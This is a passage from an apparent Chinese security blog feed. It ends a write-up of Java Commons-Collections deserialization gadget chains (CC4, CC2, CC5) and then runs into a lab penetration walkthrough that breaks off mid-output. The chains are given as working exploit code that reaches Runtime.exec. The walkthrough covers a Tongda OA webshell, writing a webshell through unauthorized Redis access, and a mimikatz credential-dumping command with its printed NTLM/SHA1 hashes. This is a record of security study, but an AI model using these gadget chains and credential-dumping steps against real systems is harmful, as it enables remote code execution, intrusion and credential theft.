<span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformingComparatorfield</span> <span class="hljs-operator">=</span>  c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformingComparatorfield.setAccessible(<span class="hljs-literal">true</span>);<br>        transformingComparatorfield.set(transformingComparator,chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>‍</p><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>一样要依赖于CC4 这里跳了一下直接走了<code>TemplatesImpl#newTransformer()</code>​去动态加载类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        InvokerTransformer&lt;Object,Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>    <br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformingComparatorfield</span> <span class="hljs-operator">=</span>  c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformingComparatorfield.setAccessible(<span class="hljs-literal">true</span>);<br>        transformingComparatorfield.set(transformingComparator,invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>‍</p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>CC5其实也是一种排列组合，就是作者在<code>TiedMapEntry</code>​中还找到了<code>toString</code>​方法也可以调用<code>LazyMap#get()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541664.png" alt="image">​</p><p>都是一样的</p><p>所以去找了一下谁去调用了<code>toString</code>​方法 找到了<code>\src.zip!\javax\management\BadAttributeValueExpException.java</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541845.png" alt="image">​</p><p>那么也是拼接到<code>LazyMap#get()</code>​就好了</p><p>由于这里组长并没有给出EXP，在自己有一定的理解情况下补充一下</p><p>‍</p><p>一开始我打算直接加入这一行代码就可以完成逻辑了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br></code></pre></td></tr></table></figure><p>但是发现并没有成功，所以继续断点看看</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541284.png" alt="image">​</p><p>发现这个<code>valObj</code>​是String型的，所以得要用反射去把这个值修改为<code>TiedMapEntry#ToString</code>​即可</p><p>‍</p><p>最后修改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">     Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;qq&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;qq&quot;</span>);<br>      <br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bfield</span> <span class="hljs-operator">=</span>  b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        bfield.setAccessible(<span class="hljs-literal">true</span>);<br>        bfield.set(badAttributeValueExpException,tiedMapEntry);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryfield.set(lazyMap,chainedTransformer);<br><br><span class="hljs-comment">//        serialize(badAttributeValueExpException);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实CC的精髓，就是去找谁的<code>readObject</code>​可以传任意调用对象，并且可以走到 <code>transform</code>​里头来进行动态类加载或者任意方法调用</p><p>最后附上CC的结构图 我个人觉得还是画得比较清晰的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312111541063.png" alt="image">​</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶 - 内部环境 - WYE内部测试靶场</title>
    <link href="/post/target-internal-environment-wye-internal-test-terminal-zb8wzw.html"/>
    <url>/post/target-internal-environment-wye-internal-test-terminal-zb8wzw.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打算把自己打过的靶的记录更新到博客中，主要更新一些常见的渗透思路和有意义的靶机(那些专门为打靶而设计还考考CTF的啥的就没必要看了)一是为了方便师傅跟着我打靶的顺序来直接打，二就是记录一下自己打靶的经历吧</p><p>‍</p><p>本次打靶是自己内部师兄搭建的 算是比较简单吧 涉及知识点如下</p><ol><li>信息收集</li><li>Redis未授权写马</li><li>域渗透</li></ol><p>‍</p><p>目标IP</p><p>10.10.104.211</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126923.png" alt="image">​</p><p>‍</p><p>通达的Nday</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126099.png" alt="image">​</p><p>上蚁剑后发现是system权限</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126212.png" alt="image">​</p><p>拿到第一个flag</p><p>flag{welcome_to_TargetOne}</p><p>查看进程没杀毒(建议加个火绒)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126338.png" alt="image">​</p><p>发现可通网卡有两个</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126464.png" alt="image">​</p><p>‍</p><h2 id="Redis未授权写马"><a href="#Redis未授权写马" class="headerlink" title="Redis未授权写马"></a>Redis未授权写马</h2><p>上传fscan扫一下C段</p><p>发现内网中还存在一台redis未授权和一个php的web页面</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126574.png" alt="image">​</p><p>上代理连接一下(端口转发socks5)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126715.png" alt="image">​</p><p>扫了一下web路径</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126874.png" alt="image">​</p><p>发现存在<a href="http://10.0.20.99/phpinfo.php">http://10.0.20.99/phpinfo.php</a></p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126032.png" alt="image">​</p><p>那么就找到了路径了所以可以使用redis来写马了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126157.png" alt="image">​</p><p>找到flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126531.png" alt="image">​</p><p>查看杀毒</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126643.png" alt="image">​</p><p>没杀毒诶(有杀毒rdp直接关即可)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126769.png" alt="820a0b4f43425e468842bc69ffd467e">​</p><p>‍</p><h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>‍</p><p>发现仍存在第二台网卡</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126892.png" alt="image">​</p><p>发现存在一台域主机</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401061126034.png" alt="image">​</p><p>那就直接传mimikatz抓密码即可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords full&quot;</span> exit &gt;&gt; log1.txt # 或者不要exit<br></code></pre></td></tr></table></figure><p>抓到hash</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs go"><br>  .#####.   mimikatz <span class="hljs-number">2.2</span><span class="hljs-number">.0</span> (x64) #<span class="hljs-number">19041</span> Jul <span class="hljs-number">29</span> <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">16</span>:<span class="hljs-number">51</span><br> .## ^ ##.  <span class="hljs-string">&quot;A La Vie, A L&#x27;Amour&quot;</span> - (oe.eo)<br> ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="hljs-comment"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="hljs-comment"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="hljs-comment">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><br>mimikatz(commandline) # privilege::debug<br>Privilege <span class="hljs-string">&#x27;20&#x27;</span> OK<br><br>mimikatz(commandline) # sekurlsa::logonpasswords full<br><br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">386750</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0005e6</span>be)<br>Session           : Interactive from <span class="hljs-number">1</span><br>User Name         : win2016<br>Domain            : VULNTARGET<br>Logon Server      : WIN2019<br>Logon Time        : <span class="hljs-number">2023</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">20</span>:<span class="hljs-number">00</span>:<span class="hljs-number">33</span><br>SID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-3795598892</span><span class="hljs-number">-1521228294</span><span class="hljs-number">-2653055093</span><span class="hljs-number">-1601</span><br>msv :<br> [<span class="hljs-number">00000005</span>] Primary<br> * Username : win2016<br> * Domain   : VULNTARGET<br> * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e<br> * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6<br> * DPAPI    : <span class="hljs-number">27</span>bd7cc4802079a6e008ed2d917c4323<br>tspkg :<br>wdigest :<br> * Username : win2016<br> * Domain   : VULNTARGET<br> * Password : (null)<br>kerberos :<br> * Username : win2016<br> * Domain   : VULNTARGET.COM<br> * Password : (null)<br>ssp :<br>credman :<br><br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">67640</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">00010838</span>)<br>Session           : Interactive from <span class="hljs-number">1</span><br>User Name         : DWM<span class="hljs-number">-1</span><br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon Time        : <span class="hljs-number">2023</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">19</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15</span><br>SID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-90</span><span class="hljs-number">-0</span><span class="hljs-number">-1</span><br>msv :<br> [<span class="hljs-number">00000005</span>] Primary<br> * Username : WIN2016$<br> * Domain   : VULNTARGET<br> * NTLM     : edb4ca24fe2a272ee1b85ec1142eaefa<br> * SHA1     : <span class="hljs-number">6</span>c7475cd2fd128806de6c679619b197d297bd92c<br>tspkg :<br>wdigest :<br> * Username : WIN2016$<br> * Domain   : VULNTARGET<br> * Password : (null)<br>kerberos :<br> * Username : WIN2016$<br> * Domain   : vulntarget.com<br> * Password : <span class="hljs-number">7</span>e <span class="hljs-number">29</span> e6 e6 <span class="hljs-number">36</span> <span class="hljs-number">37</span> d7 <span class="hljs-number">91</span> <span class="hljs-number">04</span> <span class="hljs-number">04</span> d4 <span class="hljs-number">4</span>a <span class="hljs-number">5</span>a bb fc f1 <span class="hljs-number">39</span> e5 c0 <span class="hljs-number">31</span> <span class="hljs-number">22</span> ae <span class="hljs-number">33</span> <span class="hljs-number">80</span> <span class="hljs-number">2</span>c e2 <span class="hljs-number">9</span>e <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">1</span>f <span class="hljs-number">87</span> d2 fc b9 <span class="hljs-number">85</span> c1 <span class="hljs-number">4</span>b <span class="hljs-number">5</span>c <span class="hljs-number">19</span> <span class="hljs-number">69</span> <span class="hljs-number">53</span> <span class="hljs-number">4</span>b <span class="hljs-number">15</span> <span class="hljs-number">5</span>e f4 <span class="hljs-number">1</span>e d8 <span class="hljs-number">33</span> ed <span class="hljs-number">2</span>a a7 <span class="hljs-number">72</span> <span class="hljs-number">1</span>b d2 <span class="hljs-number">60</span> <span class="hljs-number">73</span> f7 <span class="hljs-number">70</span> a6 b6 <span class="hljs-number">1</span>a a8 <span class="hljs-number">56</span> cd <span class="hljs-number">34</span> <span class="hljs-number">8</span>f <span class="hljs-number">55</span> <span class="hljs-number">98</span> <span class="hljs-number">70</span> bf <span class="hljs-number">26</span> c5 b4 c9 <span class="hljs-number">89</span> <span class="hljs-number">22</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>f <span class="hljs-number">94</span> <span class="hljs-number">9</span>f <span class="hljs-number">9</span>f <span class="hljs-number">74</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>e ba <span class="hljs-number">4</span>b ca <span class="hljs-number">59</span> df <span class="hljs-number">7</span>d f9 <span class="hljs-number">0</span>a <span class="hljs-number">93</span> <span class="hljs-number">35</span> <span class="hljs-number">86</span> <span class="hljs-number">75</span> f0 <span class="hljs-number">10</span> <span class="hljs-number">92</span> ba <span class="hljs-number">22</span> f3 <span class="hljs-number">08</span> a7 <span class="hljs-number">40</span> <span class="hljs-number">8</span>f b4 <span class="hljs-number">17</span> cd ad ab bc <span class="hljs-number">17</span> ad e8 <span class="hljs-number">17</span> <span class="hljs-number">7</span>b <span class="hljs-number">52</span> c0 eb f8 <span class="hljs-number">91</span> c8 d7 <span class="hljs-number">2</span>d <span class="hljs-number">65</span> <span class="hljs-number">23</span> b4 <span class="hljs-number">2</span>f <span class="hljs-number">37</span> f4 <span class="hljs-number">0</span>b <span class="hljs-number">17</span> e8 <span class="hljs-number">26</span> <span class="hljs-number">58</span> <span class="hljs-number">0</span>a <span class="hljs-number">81</span> <span class="hljs-number">9</span>e <span class="hljs-number">8</span>d <span class="hljs-number">70</span> b9 <span class="hljs-number">0</span>a <span class="hljs-number">3</span>e <span class="hljs-number">8</span>d a9 d6 <span class="hljs-number">62</span> cb d8 <span class="hljs-number">75</span> <span class="hljs-number">18</span> <span class="hljs-number">70</span> <span class="hljs-number">91</span> <span class="hljs-number">77</span> ed <span class="hljs-number">7</span>e ff c7 <span class="hljs-number">4</span>e <span class="hljs-number">14</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">97</span> <span class="hljs-number">0</span>d b7 <span class="hljs-number">58</span> <span class="hljs-number">4</span>d a2 d1 b2 b1 fd <span class="hljs-number">82</span> <span class="hljs-number">9</span>d <span class="hljs-number">11</span> af b5 bf ee <span class="hljs-number">23</span> e7 <span class="hljs-number">03</span> c9 a8 c9 <span class="hljs-number">5</span>a <span class="hljs-number">66</span> <span class="hljs-number">94</span> <span class="hljs-number">49</span> eb ca <span class="hljs-number">85</span> <span class="hljs-number">08</span> <span class="hljs-number">1</span>c f8 <span class="hljs-number">02</span> e3 <span class="hljs-number">81</span> <span class="hljs-number">67</span> f0 <span class="hljs-number">12</span> <span class="hljs-number">07</span> <span class="hljs-number">50</span> <span class="hljs-number">33</span> bd <span class="hljs-number">2</span>d <span class="hljs-number">42</span> <span class="hljs-number">7</span>f <span class="hljs-number">46</span> <span class="hljs-number">45</span> <span class="hljs-number">84</span> <span class="hljs-number">2</span>f <span class="hljs-number">71</span> <span class="hljs-number">9</span>e <span class="hljs-number">7</span>f a0 <span class="hljs-number">5</span>d <span class="hljs-number">01</span> fb <span class="hljs-number">7</span>c <span class="hljs-number">86</span> f7 <span class="hljs-number">08</span> bf <span class="hljs-number">97</span> <span class="hljs-number">14</span> <span class="hljs-number">91</span> <span class="hljs-number">8</span>d <span class="hljs-number">7</span>a a5 <span class="hljs-number">9</span>c e4 <span class="hljs-number">73</span> <span class="hljs-number">85</span> <span class="hljs-number">18</span> f3 c9 f7 <span class="hljs-number">24</span> <br>ssp :<br>credman :<br><br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">996</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e4</span>)<br>Session           : Service from <span class="hljs-number">0</span><br>User Name         : WIN2016$<br>Domain            : VULNTARGET<br>Logon Server      : (null)<br>Logon Time        : <span class="hljs-number">2023</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">19</span>:<span class="hljs-number">59</span>:<span class="hljs-number">14</span><br>SID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-20</span><br>msv :<br> [<span class="hljs-number">00000005</span>] Primary<br> * Username : WIN2016$<br> * Domain   : VULNTARGET<br> * NTLM     : edb4ca24fe2a272ee1b85ec1142eaefa<br> * SHA1     : <span class="hljs-number">6</span>c7475cd2fd128806de6c679619b197d297bd92c<br>tspkg :<br>wdigest :<br> * Username : WIN2016$<br> * Domain   : VULNTARGET<br> * Password : (null)<br>kerberos :<br> * Username : win2016$<br> * Domain   : VULNTARGET.COM<br> * Password : (null)<br>ssp :<br>credman :<br><br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">67805</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000108</span>dd)<br>Session           : Interactive from 